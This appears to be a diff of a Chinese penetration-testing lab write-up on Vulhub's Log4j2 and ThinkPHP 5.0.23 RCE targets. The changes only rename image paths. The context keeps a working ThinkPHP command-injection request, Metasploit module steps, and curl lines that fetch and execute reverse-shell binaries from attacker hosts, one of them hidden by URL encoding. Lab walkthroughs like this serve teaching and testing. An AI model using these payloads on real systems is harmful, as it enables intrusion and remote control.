@@ -1014,7 +1014,7 @@ curl -so /tmp/nc2msf6666 http://kali.local/nc2msf6666;chmod +x /tmp/nc2msf6666;/
 > 执行
 >
 > 删除
-> ![在 nc 中控制目标执行命令下载 payload](./../../../../../images/Vulhub1/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E5%9C%A8%20nc%20%E4%B8%AD%E6%8E%A7%E5%88%B6%E7%9B%AE%E6%A0%87%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E4%B8%8B%E8%BD%BD%20payload.png)
+> ![在 nc 中控制目标执行命令下载 payload](./../../../../../images/Vulhub/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E5%9C%A8%20nc%20%E4%B8%AD%E6%8E%A7%E5%88%B6%E7%9B%AE%E6%A0%87%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E4%B8%8B%E8%BD%BD%20payload.png)
 
 ### 2.6 thinkphp
 
@@ -1096,7 +1096,7 @@ _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
 └─# curl http://debian:8080/index.php?s=captcha -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id" |head -n 1
 ```
 
-![使用 curl 命令访问漏洞链接，并执行命令](./../../../../../images/Vulhub1/thinkphp/ThinkPHP5%205.0.23%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/%E4%BD%BF%E7%94%A8%20curl%20%E5%91%BD%E4%BB%A4%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E9%93%BE%E6%8E%A5%EF%BC%8C%E5%B9%B6%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4.png)
+![使用 curl 命令访问漏洞链接，并执行命令](./../../../../../images/Vulhub/thinkphp/ThinkPHP5%205.0.23%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/%E4%BD%BF%E7%94%A8%20curl%20%E5%91%BD%E4%BB%A4%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E9%93%BE%E6%8E%A5%EF%BC%8C%E5%B9%B6%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4.png)
 
 > 此命令也可用于外网的漏洞验证
 
@@ -1104,21 +1104,21 @@ _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
 
 在 Kali 中启动 BurpSuite
 
-![在 Kali 中启动 BurpSuite](./../../../../../images/Vulhub1/thinkphp/ThinkPHP5%205.0.23%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/%E5%9C%A8%20Kali%20%E4%B8%AD%E5%90%AF%E5%8A%A8%20BurpSuite.png)
+![在 Kali 中启动 BurpSuite](./../../../../../images/Vulhub/thinkphp/ThinkPHP5%205.0.23%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/%E5%9C%A8%20Kali%20%E4%B8%AD%E5%90%AF%E5%8A%A8%20BurpSuite.png)
 
 使用临时项目配置
 
-![使用临时项目配置 (1)](./../../../../../images/Vulhub1/thinkphp/ThinkPHP5%205.0.23%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/%E4%BD%BF%E7%94%A8%E4%B8%B4%E6%97%B6%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE%20(1).png)
+![使用临时项目配置 (1)](./../../../../../images/Vulhub/thinkphp/ThinkPHP5%205.0.23%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/%E4%BD%BF%E7%94%A8%E4%B8%B4%E6%97%B6%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE%20(1).png)
 
-![使用临时项目配置 (2)](./../../../../../images/Vulhub1/thinkphp/ThinkPHP5%205.0.23%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/%E4%BD%BF%E7%94%A8%E4%B8%B4%E6%97%B6%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE%20(2).png)
+![使用临时项目配置 (2)](./../../../../../images/Vulhub/thinkphp/ThinkPHP5%205.0.23%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/%E4%BD%BF%E7%94%A8%E4%B8%B4%E6%97%B6%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE%20(2).png)
 
 调整下界面字体大小
 
-![调整下界面字体大小](./../../../../../images/Vulhub1/thinkphp/ThinkPHP5%205.0.23%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/%E8%B0%83%E6%95%B4%E4%B8%8B%E7%95%8C%E9%9D%A2%E5%AD%97%E4%BD%93%E5%A4%A7%E5%B0%8F.png)
+![调整下界面字体大小](./../../../../../images/Vulhub/thinkphp/ThinkPHP5%205.0.23%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/%E8%B0%83%E6%95%B4%E4%B8%8B%E7%95%8C%E9%9D%A2%E5%AD%97%E4%BD%93%E5%A4%A7%E5%B0%8F.png)
 
 设置 HTTP 消息显示的字体大小
 
-![设置 HTTP 消息显示的字体大小](./../../../../../images/Vulhub1/thinkphp/ThinkPHP5%205.0.23%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/%E8%AE%BE%E7%BD%AE%20HTTP%20%E6%B6%88%E6%81%AF%E6%98%BE%E7%A4%BA%E7%9A%84%E5%AD%97%E4%BD%93%E5%A4%A7%E5%B0%8F.png)
+![设置 HTTP 消息显示的字体大小](./../../../../../images/Vulhub/thinkphp/ThinkPHP5%205.0.23%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/%E8%AE%BE%E7%BD%AE%20HTTP%20%E6%B6%88%E6%81%AF%E6%98%BE%E7%A4%BA%E7%9A%84%E5%AD%97%E4%BD%93%E5%A4%A7%E5%B0%8F.png)
 
 数据包复制到 Repeater 模块中，配置目标
 
@@ -1136,13 +1136,13 @@ Content-Length: 72
 _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
 ```
 
-![数据包复制到 Repeater 模块中，配置目标](./../../../../../images/Vulhub1/thinkphp/ThinkPHP5%205.0.23%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/%E6%95%B0%E6%8D%AE%E5%8C%85%E5%A4%8D%E5%88%B6%E5%88%B0%20Repeater%20%E6%A8%A1%E5%9D%97%E4%B8%AD%EF%BC%8C%E9%85%8D%E7%BD%AE%E7%9B%AE%E6%A0%87.png)
+![数据包复制到 Repeater 模块中，配置目标](./../../../../../images/Vulhub/thinkphp/ThinkPHP5%205.0.23%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/%E6%95%B0%E6%8D%AE%E5%8C%85%E5%A4%8D%E5%88%B6%E5%88%B0%20Repeater%20%E6%A8%A1%E5%9D%97%E4%B8%AD%EF%BC%8C%E9%85%8D%E7%BD%AE%E7%9B%AE%E6%A0%87.png)
 
 > 不能有多余的空行。
 
 发送数据包，得到响应
 
-![发送数据包，得到响应](./../../../../../images/Vulhub1/thinkphp/ThinkPHP5%205.0.23%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/%E5%8F%91%E9%80%81%E6%95%B0%E6%8D%AE%E5%8C%85%EF%BC%8C%E5%BE%97%E5%88%B0%E5%93%8D%E5%BA%94.png)
+![发送数据包，得到响应](./../../../../../images/Vulhub/thinkphp/ThinkPHP5%205.0.23%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/%E5%8F%91%E9%80%81%E6%95%B0%E6%8D%AE%E5%8C%85%EF%BC%8C%E5%BE%97%E5%88%B0%E5%93%8D%E5%BA%94.png)
 
 **渗透测试**
 
@@ -1167,7 +1167,7 @@ msf6 > search thinkphp
 msf6 >  info 0
 ```
 
-![查看模块的详细信息](./../../../../../images/Vulhub1/thinkphp/ThinkPHP5%205.0.23%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/%E6%9F%A5%E7%9C%8B%E6%A8%A1%E5%9D%97%E7%9A%84%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF.png)
+![查看模块的详细信息](./../../../../../images/Vulhub/thinkphp/ThinkPHP5%205.0.23%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/%E6%9F%A5%E7%9C%8B%E6%A8%A1%E5%9D%97%E7%9A%84%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF.png)
 
 > 此模块支持 thinkphp 5.0.23 rce
 
@@ -1225,7 +1225,7 @@ msf6 exploit(unix/webapp/thinkphp_rce) > set srvport 8080
 msf6 exploit(unix/webapp/thinkphp_rce) > run
 ```
 
-![运行 thinkphp_rce](./../../../../../images/Vulhub1/thinkphp/ThinkPHP5%205.0.23%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/%E8%BF%90%E8%A1%8C%20thinkphp_rce.png)
+![运行 thinkphp_rce](./../../../../../images/Vulhub/thinkphp/ThinkPHP5%205.0.23%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/%E8%BF%90%E8%A1%8C%20thinkphp_rce.png)
 
 >MSF 会先生成一个反弹 shell 的可执行程序
 >
@@ -1314,7 +1314,7 @@ curl http://debian:8080/index.php?s=captcha -d "_method=__construct&filter[]=sys
 
 用 BurpSuite 对漏洞进行 url 编码
 
-![用 BurpSuite 对漏洞进行 url 编码](./../../../../../images/Vulhub1/thinkphp/ThinkPHP5%205.0.23%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/%E7%94%A8%20BurpSuite%20%E5%AF%B9%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%20url%20%E7%BC%96%E7%A0%81.png)
+![用 BurpSuite 对漏洞进行 url 编码](./../../../../../images/Vulhub/thinkphp/ThinkPHP5%205.0.23%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/%E7%94%A8%20BurpSuite%20%E5%AF%B9%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%20url%20%E7%BC%96%E7%A0%81.png)
 
 ```
 curl http://debian:8080/index.php?s=captcha -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=%63%75%72%6c%20%2d%73%6f%20%2f%74%6d%70%2f%72%65%76%65%72%73%65%5f%74%63%70%5f%73%68%65%6c%6c%20%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%36%2e%32%34%2f%72%65%76%65%72%73%65%5f%74%63%70%5f%73%68%65%6c%6c%3b%63%68%6d%6f%64%20%2b%78%20%2f%74%6d%70%2f%72%65%76%65%72%73%65%5f%74%63%70%5f%73%68%65%6c%6c%3b%2f%74%6d%70%2f%72%65%76%65%72%73%65%5f%74%63%70%5f%73%68%65%6c%6c%3b%72%6d%20%2d%66%20%2f%74%6d%70%2f%72%65%76%65%72%73%65%5f%74%63%70%5f%73%68%65%6c%6c"
@@ -1322,7 +1322,7 @@ curl http://debian:8080/index.php?s=captcha -d "_method=__construct&filter[]=sys
 
 渗透成功
 
-![渗透成功](./../../../../../images/Vulhub1/thinkphp/ThinkPHP5 5.0.23 远程代码执行漏洞/渗透成功.png)
+![渗透成功](./../../../../../images/Vulhub/thinkphp/ThinkPHP5 5.0.23 远程代码执行漏洞/渗透成功.png)
 
 切换到靶场目录
 
